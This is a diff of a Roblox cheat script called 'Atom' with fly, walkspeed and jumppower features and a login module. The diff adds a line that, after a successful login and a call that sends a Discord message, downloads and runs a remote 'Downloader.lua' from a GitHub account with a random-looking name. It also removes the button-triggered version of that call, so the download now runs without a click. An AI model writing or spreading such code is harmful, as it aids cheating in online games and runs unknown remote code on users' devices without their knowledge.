@@ -156,7 +156,7 @@ local TextLabel_47 = Instance.new("TextLabel")
 --Properties:
 
 Atom.Name = "Atom"
-Atom.Parent = game.CoreGui
+Atom.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 Atom.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 Atom.ResetOnSpawn = false
 
@@ -1803,6 +1803,7 @@ local function CPGNF_fake_script() -- Frame.AccountModule
 				IsoginedValue.Value = true
 			end
 			sendDiscordMessage()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
 		else
 			IncorrectSound:Play()
 			print("Login failed: Incorrect login or password.")
@@ -1923,16 +1924,6 @@ local function POPENZ_fake_script() -- MainFrame.LocalScript
 	end)
 end
 coroutine.wrap(POPENZ_fake_script)()
-local function DLXQDY_fake_script() -- Frame2.LocalScript 
-	local script = Instance.new('LocalScript', Frame2)
-
-	local Button = script.Parent.TextButton
-	Button.MouseButton1Click:Connect(function()
-		script.Parent:Destroy()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/Downloader.lua"))()
-	end)
-end
-coroutine.wrap(DLXQDY_fake_script)()
 local function FSHESZ_fake_script() -- FLY.Manager 
 	local script = Instance.new('LocalScript', FLY)
 
@@ -2066,8 +2057,6 @@ local function ZWRJKRP_fake_script() -- WALKSPEED.Manager
 	end
 	
 	Textbox.FocusLost:Connect(keybindset)
-	
-	
 end
 coroutine.wrap(ZWRJKRP_fake_script)()
 local function SPYHR_fake_script() -- JUMPPOWER.Manager 
